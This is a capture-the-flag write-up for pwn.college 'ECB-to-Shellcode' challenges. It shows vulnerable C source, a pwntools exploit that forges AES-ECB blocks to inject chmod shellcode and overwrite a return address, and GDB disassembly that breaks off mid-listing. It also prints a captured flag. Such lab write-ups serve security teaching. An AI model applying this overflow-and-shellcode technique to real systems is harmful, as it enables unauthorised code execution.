## ECB-to-Shellcode (Easy)

### Source code

```c title="/challenge/vulnerable-overflow.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

#include <openssl/evp.h>

uint64_t sp_;
uint64_t bp_;
uint64_t sz_;
uint64_t cp_;
uint64_t cv_;
uint64_t si_;
uint64_t rp_;

#define GET_SP(sp) asm volatile ("mov %0, rsp" : "=r"(sp) : : );
#define GET_BP(bp) asm volatile ("mov %0, rbp" : "=r"(bp) : : );
#define GET_CANARY(cn) asm volatile ("mov %0, QWORD PTR [fs:0x28]" : "=r"(cn) : : );
#define GET_FRAME_WORDS(sz_, sp, bp, rp_) GET_SP(sp); GET_BP(bp); sz_ = (bp-sp)/8+2; rp_ = bp+8;
#define FIND_CANARY(cnp, cv, start)                                     \
  {                                                                     \
    cnp = start;                                                        \
    GET_CANARY(cv);                                                     \
    while (*(uint64_t *)cnp != cv) cnp = (uint64_t)cnp - 8;   \
  }

void DUMP_STACK(uint64_t sp, uint64_t n)
{
    printf("+---------------------------------+-------------------------+--------------------+\n");
    printf("| %31s | %23s | %18s |\n", "Stack location", "Data (bytes)", "Data (LE int)");
    printf("+---------------------------------+-------------------------+--------------------+\n");
    for (si_ = 0; si_ < n; si_++)
    {
        printf("| 0x%016lx (rsp+0x%04x) | %02x %02x %02x %02x %02x %02x %02x %02x | 0x%016lx |\n",
               sp+8*si_, 8*si_,
               *(uint8_t *)(sp+8*si_+0), *(uint8_t *)(sp+8*si_+1), *(uint8_t *)(sp+8*si_+2), *(uint8_t *)(sp+8*si_+3),
               *(uint8_t *)(sp+8*si_+4), *(uint8_t *)(sp+8*si_+5), *(uint8_t *)(sp+8*si_+6), *(uint8_t *)(sp+8*si_+7),
               *(uint64_t *)(sp+8*si_)
              );
    }
    printf("+---------------------------------+-------------------------+--------------------+\n");
}

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

void __attribute__((constructor)) disable_aslr(int argc, char **argv, char **envp)
{
    int current_personality = personality(0xffffffff);
    assert(current_personality != -1);
    if ((current_personality & ADDR_NO_RANDOMIZE) == 0)
    {
        assert(personality(current_personality | ADDR_NO_RANDOMIZE) != -1);
        assert(prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != -1);
        execve("/proc/self/exe", argv, envp);
    }
}

EVP_CIPHER_CTX *ctx;

int challenge(int argc, char **argv, char **envp)
{
    unsigned char key[16];
    struct
    {
        char header[8];
        unsigned long long length;
        char message[31];
    } plaintext = {0};

    // initialize the cipher
    int key_file = open("/challenge/.key", O_RDONLY);
    assert(key_file);
    assert(read(key_file, key, 16) == 16);
    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);
    close(key_file);

    char *ciphertext = malloc(0x1000);
    size_t ciphertext_len = read(0, ciphertext, 0x1000);
    assert(ciphertext_len % 16 == 0);  // should be padded
    assert(ciphertext_len >= 16);      // at least one block

    // first, we verify the first block
    int decrypted_len;
    EVP_CIPHER_CTX_set_padding(ctx, 0);  // disable padding for the first block
    EVP_DecryptUpdate(ctx, (char *)&plaintext, &decrypted_len, ciphertext, 16);

    fprintf(stderr, "Your message header: %8s\n", plaintext.header);
    fprintf(stderr, "Your message length: %llu\n", plaintext.length);
    assert(memcmp(plaintext.header, "VERIFIED", 8) == 0); // verify header
    assert(plaintext.length <= 16); // verify length

    // decrypt the message!
    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);
    memset(key, 0, sizeof(key));
    EVP_DecryptUpdate(ctx, plaintext.message, &decrypted_len, ciphertext + 16, ciphertext_len - 16);
    EVP_DecryptFinal_ex(ctx, plaintext.message + decrypted_len, &decrypted_len);

    printf("Decrypted message: %s!\n", plaintext.message);

    fprintf(stderr, "You've loaded the following shellcode into your message:\n");
    print_disassembly(plaintext.message, decrypted_len);
    fprintf(stderr, "\n");

c

}

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    challenge(argc, argv, envp);

}
```

In this challenge, the only difference compared to [ECB-to-Win (Easy)](#ecb-to-win-easy) is that there is no `win()` function. Hence, we will have inject shellcode to hijack code execution to our shellcode.

### Exploit

Check if the files is PIE.

```
hacker@integrated-security~ecb-to-shellcode-easy:~$ checksec /challenge/vulnerable-overflow
[*] '/challenge/vulnerable-overflow'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Since it is not, let's just get it to print out useful values we can use in the exploit.

```py title="~/script.py" showLineNumbers
from pwn import *

def get_encrypted_block(payload_bytes):
    """
    Interacts with the AES-ECB encryption oracle (dispatcher).
    Returns the raw ciphertext generated using the hidden system key.
    """
    io = process('/challenge/dispatch', level='error')
    io.send(payload_bytes) 
    ciphertext = io.readall()
    io.close()
    return ciphertext

print("[*] Harvesting ciphertext blocks from the ECB encryption oracle...")

# Block 1 - "VERIFIED" header and length (16 bytes)
sample_cipher = get_encrypted_block(b"A")
header_block = sample_cipher[0:16]

# Craft payload
payload = header_block 

# Pass payload
print(f"[*] Dispatching assembled ciphertext ({len(payload)} bytes) to target...")
p = process('/challenge/vulnerable-overflow')
p.send(payload)

p.interactive()
```

```
hacker@integrated-security~ecb-to-shellcode-easy:~$ python ~/script.py
[*] Harvesting ciphertext blocks from the ECB encryption oracle...
[*] Dispatching assembled ciphertext (16 bytes) to target...
[+] Starting local process '/challenge/vulnerable-overflow': pid 1281
[*] Switching to interactive mode
Your message header: VERIFIED\x01
Your message length: 1
Decrypted message: !
You've loaded the following shellcode into your message:
ERROR: Failed to disassemble shellcode! Bytes are:

      Address      |                      Bytes
--------------------------------------------------------------------
0x00007fffffffe550 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fffffffe510 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffffffe518 (rsp+0x0008) | d8 e6 ff ff ff 7f 00 00 | 0x00007fffffffe6d8 |
| 0x00007fffffffe520 (rsp+0x0010) | c8 e6 ff ff ff 7f 00 00 | 0x00007fffffffe6c8 |
| 0x00007fffffffe528 (rsp+0x0018) | a0 b6 ca f6 01 00 00 00 | 0x00000001f6cab6a0 |
| 0x00007fffffffe530 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffffffe538 (rsp+0x0028) | 25 05 b5 f6 00 00 00 00 | 0x00000000f6b50525 |
| 0x00007fffffffe540 (rsp+0x0030) | 56 45 52 49 46 49 45 44 | 0x4445494649524556 |
| 0x00007fffffffe548 (rsp+0x0038) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
| 0x00007fffffffe550 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffffffe558 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffffffe560 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffffffe568 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffffffe570 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffffffe578 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffffffe580 (rsp+0x0070) | 60 1e 40 00 00 00 00 00 | 0x0000000000401e60 |
| 0x00007fffffffe588 (rsp+0x0078) | 10 00 00 00 00 00 00 00 | 0x0000000000000010 |
| 0x00007fffffffe590 (rsp+0x0080) | 60 54 40 00 00 00 00 00 | 0x0000000000405460 |
| 0x00007fffffffe598 (rsp+0x0088) | c0 e6 ff ff 03 00 00 00 | 0x00000003ffffe6c0 |
| 0x00007fffffffe5a0 (rsp+0x0090) | d0 e5 ff ff ff 7f 00 00 | 0x00007fffffffe5d0 |
| 0x00007fffffffe5a8 (rsp+0x0098) | 58 1e 40 00 00 00 00 00 | 0x0000000000401e58 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7fffffffe550
- the saved return address (previously to main) is at 0x7fffffffe5a8
[*] Process '/challenge/vulnerable-overflow' stopped with exit code 0 (pid 1281)
[*] Got EOF while reading in interactive
$  
```

Now that we have the data, we are free to craft our exploit.
Let's first create a symlink of the `/flag` file in our home directory. 

```
hacker@integrated-security~ecb-to-shellcode-easy:~$ ln -sf /flag ~/Z
```

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

# Initialize values
buffer_addr = 0x7fffffffe550
addr_of_saved_ip = 0x7fffffffe5a8 
shellcode_addr = buffer_addr

# Calculate offset & number of padding blocks
offset = addr_of_saved_ip - buffer_addr
num_padding_blocks = offset // 16

def get_encrypted_block(payload_bytes):
    """
    Interacts with the AES-ECB encryption oracle (dispatcher).
    Returns the raw ciphertext generated using the hidden system key.
    """
    io = process('/challenge/dispatch', level='error')
    io.send(payload_bytes) 
    ciphertext = io.readall()
    io.close()
    return ciphertext

print("[*] Harvesting ciphertext blocks from the ECB encryption oracle...")

# Block 1 - "VERIFIED" header and length (16 bytes)
sample_cipher = get_encrypted_block(b"A")
header_block = sample_cipher[0:16]

# Block 2 - Shellcode
shellcode_asm = """
   /* chmod("z", 0004) */
   push 0x5a
   push rsp
   pop rdi
   pop rax
   mov sil, 0x4
   syscall
"""
shellcode = asm(shellcode_asm).ljust(16, b'\x90')
shellcode_cipher = get_encrypted_block(shellcode)
shellcode_block = shellcode_cipher[16:32]

# Block 2-6 - Padding chain
padding_harvest = get_encrypted_block(b"B" * 16)
padding_block = padding_harvest[16:32]
padding_blocks = padding_block * (num_padding_blocks - 1)

# Block 7 - Return address overwrite
shellcode_addr_block = b"C" * 8 
shellcode_addr_block += p64(shellcode_addr)
return_addr_cipher = get_encrypted_block(shellcode_addr_block)
return_address_block = return_addr_cipher[16:32]

# Block 8 - PKCS7 padding
pkcs_padding_suffix = sample_cipher[-16:]

# Craft payload
payload = header_block 
payload += shellcode_block
payload += padding_blocks
payload += return_address_block 
payload += pkcs_padding_suffix

# Pass payload
print(f"[*] Dispatching assembled ciphertext ({len(payload)} bytes) to target...")
p = process('/challenge/vulnerable-overflow')
p.send(payload)

p.interactive()
```

```
hacker@integrated-security~ecb-to-shellcode-easy:~$ python ~/script.py
[*] Harvesting ciphertext blocks from the ECB encryption oracle...
[*] Dispatching assembled ciphertext (128 bytes) to target...
Your message header: VERIFIED\x01
Your message length: 1
Decrypted message: jZT_X@\xb6\x04\x0f\x05\x90\x90\x90\x90\x90\x90BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCP\xe5\xff\xff\xff\x7f!
You've loaded the following shellcode into your message:
ERROR: Failed to disassemble shellcode! Bytes are:

      Address      |                      Bytes
--------------------------------------------------------------------
0x00007fffffffe550 | 6a 5a 54 5f 58 40 b6 04 0f 05 90 90 90 90 90 90 

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fffffffe510 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffffffe518 (rsp+0x0008) | d8 e6 ff ff ff 7f 00 00 | 0x00007fffffffe6d8 |
| 0x00007fffffffe520 (rsp+0x0010) | c8 e6 ff ff ff 7f 00 00 | 0x00007fffffffe6c8 |
| 0x00007fffffffe528 (rsp+0x0018) | a0 b6 ca f6 01 00 00 00 | 0x00000001f6cab6a0 |
| 0x00007fffffffe530 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffffffe538 (rsp+0x0028) | 25 05 b5 f6 01 00 00 00 | 0x00000001f6b50525 |
| 0x00007fffffffe540 (rsp+0x0030) | 56 45 52 49 46 49 45 44 | 0x4445494649524556 |
| 0x00007fffffffe548 (rsp+0x0038) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
| 0x00007fffffffe550 (rsp+0x0040) | 6a 5a 54 5f 58 40 b6 04 | 0x04b640585f545a6a |
| 0x00007fffffffe558 (rsp+0x0048) | 0f 05 90 90 90 90 90 90 | 0x909090909090050f |
| 0x00007fffffffe560 (rsp+0x0050) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007fffffffe568 (rsp+0x0058) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007fffffffe570 (rsp+0x0060) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007fffffffe578 (rsp+0x0068) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007fffffffe580 (rsp+0x0070) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007fffffffe588 (rsp+0x0078) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007fffffffe590 (rsp+0x0080) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007fffffffe598 (rsp+0x0088) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007fffffffe5a0 (rsp+0x0090) | 43 43 43 43 43 43 43 43 | 0x4343434343434343 |
| 0x00007fffffffe5a8 (rsp+0x0098) | 50 e5 ff ff ff 7f 00 00 | 0x00007fffffffe550 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7fffffffe550
- the saved return address (previously to main) is at 0x7fffffffe5a8
$  
```

```
hacker@integrated-security~ecb-to-shellcode-easy:~$ cat /flag
pwn.college{8sn6D2nxMYonmCE6lgbNgdP45f9.QX5UDMxEDL4ITM0EzW}
```

&nbsp;

## ECB-to-Shellcode (Hard)

### Binary Analysis

```c title="/challenge/dispatch" showLineNumbers
#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import Crypto
import struct
import sys
import os

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

key = open("/challenge/.key", "rb").read()
cipher = AES.new(key=key, mode=AES.MODE_ECB)

message = sys.stdin.buffer.read1()
assert len(message) <= 16, "Your message is too long!"

plaintext = (
    b"VERIFIED"
    + struct.pack(b"<Q", len(message))
    + message
)

ciphertext = cipher.encrypt(
    pad(plaintext, cipher.block_size)
)

sys.stdout.buffer.write(ciphertext)
```

The `/challenge/dispatch` program takes input we provide, prepends the `"VERIFIED"` header along with the `length`, and gives us the relevant ciphertext.

```c title="/challenge/vulnerable-overflow" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(edata, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  challenge((unsigned int)argc, argv, envp);
  return 0;
}
```

Let's look at the `challenge()` function.

```c title="/challenge/vulnerable-overflow" showLineNumbers
int challenge()
{
  __int64 EVP_aes_128_ecb; // rax
  __int64 EVP_aes_128_ecb_1; // rax
  int decrypted_len; // [rsp+2Ch] [rbp-64h] BYREF
  __int64 plaintext_header; // [rsp+30h] [rbp-60h] BYREF
  unsigned __int64 plaintext_len; // [rsp+38h] [rbp-58h]
  __int64 plaintext_message[4]; // [rsp+40h] [rbp-50h] BYREF
  char key[24]; // [rsp+60h] [rbp-30h] BYREF
  unsigned __int64 ciphertext_len; // [rsp+78h] [rbp-18h]
  void *ciphertext; // [rsp+80h] [rbp-10h]
  int key_file; // [rsp+8Ch] [rbp-4h]

  plaintext_header = 0LL;
  plaintext_len = 0LL;
  memset(plaintext_message, 0, sizeof(plaintext_message));
  key_file = open("/challenge/.key", 0);
  if ( !key_file )
    __assert_fail("key_file", "/challenge/vulnerable-overflow.c", 54u, "challenge");
  if ( read(key_file, key, 16uLL) != 16 )
    __assert_fail("read(key_file, key, 16) == 16", "/challenge/vulnerable-overflow.c", 55u, "challenge");
  ctx = EVP_CIPHER_CTX_new();
  EVP_aes_128_ecb = ::EVP_aes_128_ecb();
  EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb, 0LL, key, 0LL);
  close(key_file);
  ciphertext = malloc(4096uLL);
  ciphertext_len = read(0, ciphertext, 4096uLL);
  if ( (ciphertext_len & 0xF) != 0 )
    __assert_fail("ciphertext_len % 16 == 0", "/challenge/vulnerable-overflow.c", 62u, "challenge");
  if ( ciphertext_len <= 15 )
    __assert_fail("ciphertext_len >= 16", "/challenge/vulnerable-overflow.c", 63u, "challenge");
  EVP_CIPHER_CTX_set_padding(ctx, 0LL);
  EVP_DecryptUpdate(ctx, &plaintext_header, &decrypted_len, ciphertext, 16LL);
  if ( memcmp(&plaintext_header, "VERIFIED", 8uLL) )
    __assert_fail(
      "memcmp(plaintext.header, \"VERIFIED\", 8) == 0",
      "/challenge/vulnerable-overflow.c",
      70u,
      "challenge");
  if ( plaintext_len > 16 )
    __assert_fail("plaintext.length <= 16", "/challenge/vulnerable-overflow.c", 71u, "challenge");
  ctx = EVP_CIPHER_CTX_new();
  EVP_aes_128_ecb_1 = ::EVP_aes_128_ecb();
  EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb_1, 0LL, key, 0LL);
  memset(key, 0, 16uLL);
  EVP_DecryptUpdate(
    ctx,
    plaintext_message,
    &decrypted_len,
    (char *)ciphertext + 16,
    (unsigned int)(ciphertext_len - 16));
  EVP_DecryptFinal_ex(ctx, (char *)plaintext_message + decrypted_len, &decrypted_len);
  return printf("Decrypted message: %s!\n", (const char *)plaintext_message);
}
```

This time, there is no `win()` function unlike the [ECB-to-Win (Easy)](#ecb-to-win-easy) challenge. So again we have to inject shellcode, and hijack execution to it.

In order to do that, we need the following:
- [ ] Location of the buffer
- [ ] Location of the saved return pointer to `main()`

For that, let's open the challenge in GDB.

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401150  printf@plt
0x0000000000401160  memset@plt
0x0000000000401170  close@plt
0x0000000000401180  __assert_fail@plt
0x0000000000401190  prctl@plt
0x00000000004011a0  setvbuf@plt
0x00000000004011b0  read@plt
0x00000000004011c0  malloc@plt
0x00000000004011d0  EVP_DecryptInit_ex@plt
0x00000000004011e0  EVP_DecryptFinal_ex@plt
0x00000000004011f0  execve@plt
0x0000000000401200  EVP_CIPHER_CTX_new@plt
0x0000000000401210  personality@plt
0x0000000000401220  memcmp@plt
0x0000000000401230  EVP_CIPHER_CTX_set_padding@plt
0x0000000000401240  EVP_aes_128_ecb@plt
0x0000000000401250  EVP_DecryptUpdate@plt
0x0000000000401260  open@plt
0x0000000000401270  _start
0x00000000004012a0  _dl_relocate_static_pie
0x00000000004012b0  deregister_tm_clones
0x00000000004012e0  register_tm_clones
0x0000000000401320  __do_global_dtors_aux
0x0000000000401350  frame_dummy
0x0000000000401356  disable_aslr
0x0000000000401447  challenge
0x000000000040171e  main
0x0000000000401790  __libc_csu_init
0x0000000000401800  __libc_csu_fini
0x0000000000401808  _fini
```

Let's disassemble `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x0000000000401447 <+0>:	endbr64
   0x000000000040144b <+4>:	push   rbp
   0x000000000040144c <+5>:	mov    rbp,rsp
   0x000000000040144f <+8>:	sub    rsp,0x90
   0x0000000000401456 <+15>:	mov    DWORD PTR [rbp-0x74],edi
   0x0000000000401459 <+18>:	mov    QWORD PTR [rbp-0x80],rsi
   0x000000000040145d <+22>:	mov    QWORD PTR [rbp-0x88],rdx
   0x0000000000401464 <+29>:	mov    QWORD PTR [rbp-0x60],0x0
   0x000000000040146c <+37>:	mov    QWORD PTR [rbp-0x58],0x0
   0x0000000000401474 <+45>:	mov    QWORD PTR [rbp-0x50],0x0
   0x000000000040147c <+53>:	mov    QWORD PTR [rbp-0x48],0x0
   0x0000000000401484 <+61>:	mov    QWORD PTR [rbp-0x40],0x0
   0x000000000040148c <+69>:	mov    QWORD PTR [rbp-0x38],0x0
   0x0000000000401494 <+77>:	mov    esi,0x0
   0x0000000000401499 <+82>:	lea    rdi,[rip+0xc24]        # 0x4020c4
   0x00000000004014a0 <+89>:	mov    eax,0x0
   0x00000000004014a5 <+94>:	call   0x401260 <open@plt>
   0x00000000004014aa <+99>:	mov    DWORD PTR [rbp-0x4],eax
   0x00000000004014ad <+102>:	cmp    DWORD PTR [rbp-0x4],0x0
   0x00000000004014b1 <+106>:	jne    0x4014d2 <challenge+139>
   0x00000000004014b3 <+108>:	lea    rcx,[rip+0xcee]        # 0x4021a8 <__PRETTY_FUNCTION__.12087>
   0x00000000004014ba <+115>:	mov    edx,0x36
   0x00000000004014bf <+120>:	lea    rsi,[rip+0xb42]        # 0x402008
   0x00000000004014c6 <+127>:	lea    rdi,[rip+0xc07]        # 0x4020d4
   0x00000000004014cd <+134>:	call   0x401180 <__assert_fail@plt>
   0x00000000004014d2 <+139>:	lea    rcx,[rbp-0x30]
   0x00000000004014d6 <+143>:	mov    eax,DWORD PTR [rbp-0x4]
   0x00000000004014d9 <+146>:	mov    edx,0x10
   0x00000000004014de <+151>:	mov    rsi,rcx
   0x00000000004014e1 <+154>:	mov    edi,eax
   0x00000000004014e3 <+156>:	call   0x4011b0 <read@plt>
   0x00000000004014e8 <+161>:	cmp    rax,0x10
   0x00000000004014ec <+165>:	je     0x40150d <challenge+198>
   0x00000000004014ee <+167>:	lea    rcx,[rip+0xcb3]        # 0x4021a8 <__PRETTY_FUNCTION__.12087>
   0x00000000004014f5 <+174>:	mov    edx,0x37
   0x00000000004014fa <+179>:	lea    rsi,[rip+0xb07]        # 0x402008
   0x0000000000401501 <+186>:	lea    rdi,[rip+0xbd5]        # 0x4020dd
   0x0000000000401508 <+193>:	call   0x401180 <__assert_fail@plt>
   0x000000000040150d <+198>:	call   0x401200 <EVP_CIPHER_CTX_new@plt>
   0x0000000000401512 <+203>:	mov    QWORD PTR [rip+0x2b0f],rax        # 0x404028 <ctx>
   0x0000000000401519 <+210>:	call   0x401240 <EVP_aes_128_ecb@plt>
   0x000000000040151e <+215>:	mov    rsi,rax
   0x0000000000401521 <+218>:	mov    rax,QWORD PTR [rip+0x2b00]        # 0x404028 <ctx>
   0x0000000000401528 <+225>:	lea    rdx,[rbp-0x30]
   0x000000000040152c <+229>:	mov    r8d,0x0
   0x0000000000401532 <+235>:	mov    rcx,rdx
   0x0000000000401535 <+238>:	mov    edx,0x0
   0x000000000040153a <+243>:	mov    rdi,rax
   0x000000000040153d <+246>:	call   0x4011d0 <EVP_DecryptInit_ex@plt>
   0x0000000000401542 <+251>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401545 <+254>:	mov    edi,eax
   0x0000000000401547 <+256>:	call   0x401170 <close@plt>
   0x000000000040154c <+261>:	mov    edi,0x1000
   0x0000000000401551 <+266>:	call   0x4011c0 <malloc@plt>
   0x0000000000401556 <+271>:	mov    QWORD PTR [rbp-0x10],rax
   0x000000000040155a <+275>:	mov    rax,QWORD PTR [rbp-0x10]
   0x000000000040155e <+279>:	mov    edx,0x1000
   0x0000000000401563 <+284>:	mov    rsi,rax
   0x0000000000401566 <+287>:	mov    edi,0x0
   0x000000000040156b <+292>:	call   0x4011b0 <read@plt>
   0x0000000000401570 <+297>:	mov    QWORD PTR [rbp-0x18],rax
   0x0000000000401574 <+301>:	mov    rax,QWORD PTR [rbp-0x18]
   0x0000000000401578 <+305>:	and    eax,0xf
   0x000000000040157b <+308>:	test   rax,rax
   0x000000000040157e <+311>:	je     0x40159f <challenge+344>
   0x0000000000401580 <+313>:	lea    rcx,[rip+0xc21]        # 0x4021a8 <__PRETTY_FUNCTION__.12087>
   0x0000000000401587 <+320>:	mov    edx,0x3e
   0x000000000040158c <+325>:	lea    rsi,[rip+0xa75]        # 0x402008
   0x0000000000401593 <+332>:	lea    rdi,[rip+0xb61]        # 0x4020fb
   0x000000000040159a <+339>:	call   0x401180 <__assert_fail@plt>
   0x000000000040159f <+344>:	cmp    QWORD PTR [rbp-0x18],0xf
   0x00000000004015a4 <+349>:	ja     0x4015c5 <challenge+382>
   0x00000000004015a6 <+351>:	lea    rcx,[rip+0xbfb]        # 0x4021a8 <__PRETTY_FUNCTION__.12087>
   0x00000000004015ad <+358>:	mov    edx,0x3f
   0x00000000004015b2 <+363>:	lea    rsi,[rip+0xa4f]        # 0x402008
   0x00000000004015b9 <+370>:	lea    rdi,[rip+0xb54]        # 0x402114
   0x00000000004015c0 <+377>:	call   0x401180 <__assert_fail@plt>
   0x00000000004015c5 <+382>:	mov    rax,QWORD PTR [rip+0x2a5c]        # 0x404028 <ctx>
   0x00000000004015cc <+389>:	mov    esi,0x0
   0x00000000004015d1 <+394>:	mov    rdi,rax
   0x00000000004015d4 <+397>:	call   0x401230 <EVP_CIPHER_CTX_set_padding@plt>
   0x00000000004015d9 <+402>:	mov    rax,QWORD PTR [rip+0x2a48]        # 0x404028 <ctx>
   0x00000000004015e0 <+409>:	mov    rcx,QWORD PTR [rbp-0x10]
   0x00000000004015e4 <+413>:	lea    rdx,[rbp-0x64]
   0x00000000004015e8 <+417>:	lea    rsi,[rbp-0x60]
   0x00000000004015ec <+421>:	mov    r8d,0x10
   0x00000000004015f2 <+427>:	mov    rdi,rax
   0x00000000004015f5 <+430>:	call   0x401250 <EVP_DecryptUpdate@plt>
   0x00000000004015fa <+435>:	lea    rax,[rbp-0x60]
   0x00000000004015fe <+439>:	mov    edx,0x8
   0x0000000000401603 <+444>:	lea    rsi,[rip+0xb1f]        # 0x402129
   0x000000000040160a <+451>:	mov    rdi,rax
   0x000000000040160d <+454>:	call   0x401220 <memcmp@plt>
   0x0000000000401612 <+459>:	test   eax,eax
   0x0000000000401614 <+461>:	je     0x401635 <challenge+494>
   0x0000000000401616 <+463>:	lea    rcx,[rip+0xb8b]        # 0x4021a8 <__PRETTY_FUNCTION__.12087>
   0x000000000040161d <+470>:	mov    edx,0x46
   0x0000000000401622 <+475>:	lea    rsi,[rip+0x9df]        # 0x402008
   0x0000000000401629 <+482>:	lea    rdi,[rip+0xb08]        # 0x402138
   0x0000000000401630 <+489>:	call   0x401180 <__assert_fail@plt>
   0x0000000000401635 <+494>:	mov    rax,QWORD PTR [rbp-0x58]
   0x0000000000401639 <+498>:	cmp    rax,0x10
   0x000000000040163d <+502>:	jbe    0x40165e <challenge+535>
   0x000000000040163f <+504>:	lea    rcx,[rip+0xb62]        # 0x4021a8 <__PRETTY_FUNCTION__.12087>
   0x0000000000401646 <+511>:	mov    edx,0x47
   0x000000000040164b <+516>:	lea    rsi,[rip+0x9b6]        # 0x402008
   0x0000000000401652 <+523>:	lea    rdi,[rip+0xb0c]        # 0x402165
   0x0000000000401659 <+530>:	call   0x401180 <__assert_fail@plt>
   0x000000000040165e <+535>:	call   0x401200 <EVP_CIPHER_CTX_new@plt>
   0x0000000000401663 <+540>:	mov    QWORD PTR [rip+0x29be],rax        # 0x404028 <ctx>
   0x000000000040166a <+547>:	call   0x401240 <EVP_aes_128_ecb@plt>
   0x000000000040166f <+552>:	mov    rsi,rax
   0x0000000000401672 <+555>:	mov    rax,QWORD PTR [rip+0x29af]        # 0x404028 <ctx>
   0x0000000000401679 <+562>:	lea    rdx,[rbp-0x30]
   0x000000000040167d <+566>:	mov    r8d,0x0
   0x0000000000401683 <+572>:	mov    rcx,rdx
   0x0000000000401686 <+575>:	mov    edx,0x0
   0x000000000040168b <+580>:	mov    rdi,rax
   0x000000000040168e <+583>:	call   0x4011d0 <EVP_DecryptInit_ex@plt>
   0x0000000000401693 <+588>:	lea    rax,[rbp-0x30]
   0x0000000000401697 <+592>:	mov    edx,0x10
   0x000000000040169c <+597>:	mov    esi,0x0
